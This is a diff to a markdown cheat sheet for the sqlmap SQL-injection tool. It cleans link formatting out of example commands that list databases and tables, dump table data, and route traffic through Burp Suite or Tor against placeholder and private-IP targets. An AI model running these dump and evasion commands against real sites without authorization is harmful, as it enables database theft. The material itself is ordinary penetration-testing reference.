@@ -94,13 +94,13 @@ sqlmap -u 'http://10.64.129.84/ai/includes/user_login?email=test&password=test' 
 
 ```bash
 # 1. Find Databases
-sqlmap -u "[http://site.com/id=1](http://site.com/id=1)" --dbs --batch
+sqlmap -u "http://site.com/id=1" --dbs --batch
 
 # 2. List Tables
-sqlmap -u "[http://site.com/id=1](http://site.com/id=1)" -D <db_name> --tables --batch
+sqlmap -u "http://site.com/id=1" -D <db_name> --tables --batch
 
 # 3. Dump Data
-sqlmap -u "[http://site.com/id=1](http://site.com/id=1)" -D <db_name> -T <table_name> --dump --batch
+sqlmap -u "http://site.com/id=1" -D <db_name> -T <table_name> --dump --batch
 ```
 
 ##### 📩 POST Method (Request Files)
@@ -153,7 +153,7 @@ equaltolike : Changes = to LIKE
 ```bash
 
 # Route through Burp Suite
---proxy="[http://127.0.0.1:8080](http://127.0.0.1:8080)"
+--proxy="http://127.0.0.1:8080"
 
 # Route through Tor
 --tor --check-tor
@@ -176,7 +176,8 @@ equaltolike : Changes = to LIKE
 ```bash
 
 # Scan a specific parameter ONLY (e.g., 'id')
-sqlmap -u "[http://site.com/id=1&user=test](http://site.com/id=1&user=test)" -p id --dbs
+sqlmap -u "http://site.com/id=1&user=test" -p id --dbs
+
 
 # Beginner Wizard Mode
 sqlmap --wizard
@@ -307,7 +308,7 @@ Here is the breakdown of each component:
 sqlmap The base command that launches the tool.
 
 ```bash
--u "<http://target.com/id=1>" The Target: Specifies the URL to test.
+-u "http://target.com/id=1" The Target: Specifies the URL to test.
 ```
 
 Tip: Always wrap the URL in double quotes. This prevents the terminal from
